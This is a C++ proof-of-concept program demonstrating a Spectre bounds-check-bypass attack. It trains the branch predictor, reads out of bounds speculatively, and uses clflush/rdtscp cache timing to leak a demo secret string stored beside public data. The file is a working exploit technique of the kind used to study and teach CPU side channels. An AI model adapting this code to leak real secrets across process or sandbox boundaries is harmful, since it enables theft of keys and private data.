#include <algorithm>
#include <cstddef>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <limits>
#include <memory>
#include <vector>
#include <x86intrin.h>

using namespace std;
uint64_t time1, time2;
uint32_t junk;
#define READ_LATENCY_THRESHOLD 80

const char *public_data = "Some public info";
const char *private_data = "Key is XYZ777AAA";

class Foo {
public:
  const char *public_data = "Some public info";

private:
  const char *private_data = "Key is XYZ777AAA";
};
const Foo foo;

void ForceRead(const void *p) {
  (void)*reinterpret_cast<const volatile char *>(p);
}

// faster reads why?
// extern "C" uint64_t MeasureReadLatency(const void *address);

// read latency
uint64_t MeasureReadLatency(const void *address) {
  _mm_mfence();
  _mm_lfence();
  time1 = __rdtscp(&junk);
  _mm_lfence();
  ForceRead(address);
  _mm_lfence();
  time2 = __rdtscp(&junk);
  return time2 - time1;
}

inline void FlushDataCacheLineNoBarrier(const void *address) {
  _mm_clflush(address);
}

inline void MemoryAndSpeculationBarrier() {
  _mm_mfence();
  _mm_lfence();
}

inline void FlushDataCacheLine(void *address) {
  FlushDataCacheLineNoBarrier(address);
  MemoryAndSpeculationBarrier();
}

constexpr size_t kCacheLineBytes = 64;
constexpr size_t kPageBytes = 4 * 1024;
constexpr size_t kRealElements = 256; // char [0..255]

class TimingArray {
public:
  using ValueType = int;

  TimingArray() {
    // force copy on write
    for (int i = 0; i < size(); ++i) {
      ElementAt(i) = -1;
    }

    cached_read_latency_threshold_ = READ_LATENCY_THRESHOLD;
  }

  TimingArray(TimingArray &) = delete;
  TimingArray &operator=(TimingArray &) = delete;

  ValueType &operator[](size_t i) {
    // Pseudo-random
    // https://en.wikipedia.org/wiki/Linear_congruential_generator#c_%E2%89%A0_0
    size_t el = (100 + i * 113) % kRealElements;

    return elements_[1 + el].cache_lines[0].value;
  }

  size_t size() const { return kRealElements; }

  void FlushFromCache() {
    // We only need to flush the cache lines with elements on them.
    for (int i = 0; i < size(); ++i) {
      FlushDataCacheLineNoBarrier(&ElementAt(i));
    }

    MemoryAndSpeculationBarrier();
  }

  int FindFirstCachedElementIndexAfter(int start_after) {
    if (start_after >= size()) {
      return -1;
    }

    for (int i = 1; i <= size(); ++i) {
      int el = (start_after + i) % size();
      uint64_t read_latency = MeasureReadLatency(&ElementAt(el));
      if (read_latency <= cached_read_latency_threshold_) {
        return el;
      }
    }
    return -1;
  }

private:
  // Avoid (*this)[i] everywhere.
  ValueType &ElementAt(size_t i) { return (*this)[i]; }

  uint64_t cached_read_latency_threshold_;
  // tamaño: 64 bytes
  struct alignas(kCacheLineBytes) CacheLine {
    ValueType value;
  };

  //  struct "Element", bigger than a page + an aditional cache line
  // 64 CacheLines
  static const int kCacheLinesPerPage = kPageBytes / kCacheLineBytes;
  // sz: 4160 bytes, 64x65
  struct Element {
    array<CacheLine, kCacheLinesPerPage + 1> cache_lines;
  };

  // pading to avoid inference of assignments
  vector<Element> elements_{1 + kRealElements + 1};
};

vector<uint64_t> final_run;

static char LeakByte(const char *data, size_t offset) {
  TimingArray timing_array;
  unique_ptr<size_t> size_in_heap =
      unique_ptr<size_t>(new size_t(strlen(data)));
  for (int run = 0;; ++run) {
    timing_array.FlushFromCache();
    int safe_offset = run % strlen(data);

    for (size_t i = 0; i < 2048; ++i) {
      FlushDataCacheLine(size_in_heap.get());

      // train branch predictor
      size_t local_offset =
          offset + (safe_offset - offset) * bool((i + 1) % 2048);

      if (local_offset < *size_in_heap) {
        // MemoryAndSpeculationBarrier(); // this kills spectre
        ForceRead(&timing_array[data[local_offset]]);
      }
    }
    int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);

    // index valid != -1 , different than `public_data` value, at
    // safe_offset index, depending of current `run`.
    if (ret >= 0 && ret != data[safe_offset]) {
      final_run.push_back(run);
      return ret;
    }
    if (run > 10000) {
      cerr << "Does not converge" << endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  // const size_t private_offset = private_data - public_data;
  const size_t private_offset = strlen(foo.public_data) + 1; // string
  // const size_t private_offset = strlen(public_data) + 1;
  // cout << "foo size: " << sizeof(foo) << '\n';
  // cout << "private offset: " << private_offset << '\n';
  // cout << "public addr: " << (void *)foo.public_data << '\n';
  // cout << "public addr: " << (void *)public_data << '\n';
  // cout << "private addr: " << (void *)foo.private_data << '\n';
  // cout << "private addr: " << (void *)private_data << '\n';
  cout << "Leaking the string:\n";
  cout.flush();
  // for (size_t i = 0; i < strlen(private_data); ++i) {
  for (size_t i = 0; i < 16; ++i) {
    // for (size_t i = 0; i < 40; ++i) {
    // cout << LeakByte(public_data, private_offset + i);
    cout << LeakByte(foo.public_data, private_offset + i);
    // cout << " in run: " << final_run[i] << '\n';
    cout.flush();
  }
  cout << "\n";
  exit(EXIT_SUCCESS);
}
